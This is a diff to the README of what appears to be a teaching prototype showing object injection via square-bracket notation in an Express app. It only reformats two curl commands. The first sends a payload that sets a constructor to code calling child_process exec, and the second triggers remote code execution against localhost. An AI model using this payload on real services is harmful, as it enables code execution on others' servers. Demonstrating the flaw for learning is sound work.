@@ -10,7 +10,7 @@ A prototype to demonstrate the dangers of square bracket notation using object i
 
 ```console
 $ git clone https://github.com/0xdbe/express-object-injection.git
-cd express-object-injection
+$ cd express-object-injection
 ```
 
 * Install express
@@ -29,13 +29,17 @@ $ node index.js
 * Setting a malicious fuction as constructor
 
 ```console
-$ curl http://localhost:3000/api/user -H 'Content-Type: application/json' --data '["constructor", "var require = global.require || global.process.mainModule.constructor._load;require(\"child_process\").exec(arguments[0], console.log)"]'
+$ curl http://localhost:3000/api/user \
+    -H 'Content-Type: application/json' \
+    --data '["constructor", "var require = global.require || global.process.mainModule.constructor._load;require(\"child_process\").exec(arguments[0], console.log)"]'
 ```
 
 * Call the malicious function allowing a remote code execute (RCE)
 
 ```console
-$ curl http://localhost:3000/api/user -H 'Content-Type: application/json' --data '["anyVal", "date"]'
+$ curl http://localhost:3000/api/user \
+  -H 'Content-Type: application/json' \
+  --data '["anyVal", "date"]'
 ```
 
 note: this vulnerable function is not detected by ESLint Security !!
